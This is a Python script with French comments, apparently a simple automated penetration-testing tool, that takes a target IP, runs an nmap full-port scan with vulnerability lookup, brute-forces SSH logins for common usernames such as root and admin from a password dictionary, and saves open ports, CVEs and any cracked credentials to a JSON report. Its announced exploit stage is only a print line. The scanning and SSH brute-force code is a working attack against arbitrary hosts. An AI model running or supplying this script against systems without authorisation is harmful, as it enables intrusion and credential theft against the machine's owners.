#Ce script permet de faire un test d'intrusion sur une machine distante, il prend comme argument l'adresse IP de la machine distante, et appele les scripts bruteforcesshmdp.py, nmap.py et les exploit compatible afin de rédiger un rapport de test d'intrusion dans un fichier json.
import subprocess
import sys
import json

# Lance le script qui installera les dépendances
subprocess.call(["python3", "dependencies.py"])
import paramiko

# Ici, il y a toutes les fonctions qui seront appelées lors de l'execution du script

# Fonction qui lance un scan Nmap sur la machine distante
def run_nmap_scan(ip_address):
    # Lance un scan Nmap sur la machine distante
    output = subprocess.check_output(["nmap", "-p-", "-sV", "--script", "vulners", ip_address])
    
    # Sort les ports ouverts, les services et les CVEs
    open_tcp_ports = []
    open_udp_ports = []
    services = {}
    cves = []
    
    lines = output.decode().splitlines()
    for line in lines:
        if "open" in line and "tcp" in line:
            port = line.split("/")[0]
            open_tcp_ports.append(port)
        elif "open" in line and "udp" in line:
            port = line.split("/")[0]
            open_udp_ports.append(port)
        elif "Service Info" in line:
            service = line.split(":")[1].strip()
            services[port] = service
        elif "CVE" in line:
            cve = line.split(":")[1].strip()
            cves.append(cve)
    
    return open_tcp_ports, open_udp_ports, services, cves

# Fonction qui exécute un bruteforce sur le service SSH
def brute_force_ssh(ip):
    usernames = ["debian", "root", "user", "admin"]
    
    with open("dictionary.txt", "r") as f:
        passwords = f.read().splitlines()
    
    for username in usernames:
        for password in passwords:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            try:
                client.connect(ip, username=username, password=password)
                print(f"Successful login: {username}:{password}")
                return f"{username}:{password}"
            except paramiko.AuthenticationException:
                continue
    print("Attack unsuccessful")



# Début du script
# Demande a l'utilisateur d'entrer l'adresse IP de la machine distante
ip_address = input("Enter the IP address to scan: ")

# Execute la fonction run_nmap_scan avec l'adresse IP fournie
print("Lancement du scan Nmap...")
open_tcp_ports, open_udp_ports, services, cves = run_nmap_scan(ip_address)

# Affiche les résultats du scan a l'écran
print("Ports TCP ouvert:", open_tcp_ports)
print("Ports UDP ouvert:", open_udp_ports)
print("Services:", services)
print("CVEs:", cves)

# Appelle la fonction brute_force_ssh avec l'adresse IP fournie
print("Lancement du brute force SSH...")

resultbruteforcessh = brute_force_ssh(ip_address)

# Appel des exploits compatibles
print("Lancement des exploits...")

# Rédaction du rapport de test d'intrusion dans un fichier json
print("Rédaction du rapport de test d'intrusion...")
report = {
    "ip_address": ip_address,
    "open_tcp_ports": open_tcp_ports,
    "open_udp_ports": open_udp_ports,
    "services": services,
    "cves": cves,
    "identifiants SSH": resultbruteforcessh
}

with open("report.json", "w") as f:
    json.dump(report, f)

print("Rapport de test d'intrusion terminé !, les résultats sont dans le fichier rapport.json")